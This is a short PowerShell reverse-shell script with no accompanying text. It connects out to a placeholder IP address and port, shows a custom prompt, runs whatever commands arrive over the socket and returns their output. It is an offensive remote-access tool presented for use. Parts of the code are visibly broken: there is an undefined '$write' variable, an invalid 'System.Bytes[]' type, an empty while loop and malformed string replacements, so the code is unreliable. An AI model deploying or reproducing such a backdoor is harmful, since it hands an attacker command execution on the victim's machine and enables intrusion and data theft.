$socket = new-object System.Net.Sockets.TcpClient('Ip Address', port);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.Io.streamWriter($stream);
$buffer = new-object System.Bytes[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
    $writer.write("BhatAasim> ");
    $write.Flush();
    $read = $null;
    while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0 , 1024)) -eq $null)
    $out = $encoding.GetString($buffer , 0 , $read).Replace("'r' n ", "").Replace("'n'", "");
    if(!$out.equals('exit')){
        $out = $out.split(' ')
            $res = [string](&$out[0] $out[1..$out.length]);
        if ($res -ne $null) {$writer.WriteLine($res)}
    }
}while (!$out.equals("exit"))
$writer.close();$socket.close();
